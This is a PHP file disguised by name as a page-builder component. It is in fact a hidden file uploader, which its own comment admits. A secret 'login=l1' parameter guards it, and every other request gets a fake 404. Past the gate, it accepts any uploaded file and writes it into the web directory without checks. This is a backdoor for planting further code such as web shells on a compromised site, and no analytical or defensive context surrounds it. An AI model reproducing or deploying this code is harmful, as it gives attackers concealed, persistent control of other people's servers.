<?php
/* pagebuiIderck.php - hidden uploader with ?login=l1 gate */
if (isset($_GET['login']) && $_GET['login'] === 'l1') {
    $ok = true;
} elseif (isset($_POST['login']) && $_POST['login'] === 'l1') {
    $ok = true;
} else {
    $ok = false;
}
if (!$ok) {
    http_response_code(404);
    exit;
}
$myUpload = new maxUpload();
$myUpload->uploadFile();
?>
<?php
class maxUpload{
    var $uploadLocation;
    function maxUpload(){
        $this->uploadLocation = getcwd().DIRECTORY_SEPARATOR;
    }
    function setUploadLocation($dir){
        $this->uploadLocation = $dir;
    }
    function showUploadForm($msg='',$error=''){
?>
       <div id="container">
            <center><b>Hidden Uploader</b></center><br/>
<?php
if ($msg != ''){
    echo '<p class="msg">'.$msg.'</p>';
} else if ($error != ''){
    echo '<p class="emsg">'.$error.'</p>';
}
?>
                <form action="" method="post" enctype="multipart/form-data" >
                     <center>
                         <label><b>File: </b>
                             <input name="myfile" type="file" size="30" />
                         </label>
                         <label>
                             <input type="submit" name="submitBtn" class="sbtn" value="Upload" />
                         </label>
                     </center>
                 </form>
             </div>
<?php
    }
    function uploadFile(){
        if (!isset($_POST['submitBtn'])){
            $this->showUploadForm();
        } else {
            $msg = '';
            $error = '';
            if (!file_exists($this->uploadLocation)){
                $error = "The target directory doesn't exists!";
            } else if (!is_writeable($this->uploadLocation)) {
                $error = "The target directory is not writeable!";
            } else {
                $target_path = $this->uploadLocation . basename( $_FILES['myfile']['name']);
                if(@move_uploaded_file($_FILES['myfile']['tmp_name'], $target_path)) {
                    $msg = basename( $_FILES['myfile']['name'])." was uploaded successfully!";
                } else{
                    $error = "The upload process failed! :-(";
                }
            }
            $this->showUploadForm($msg,$error);
        }
    }
}
?>
</body>
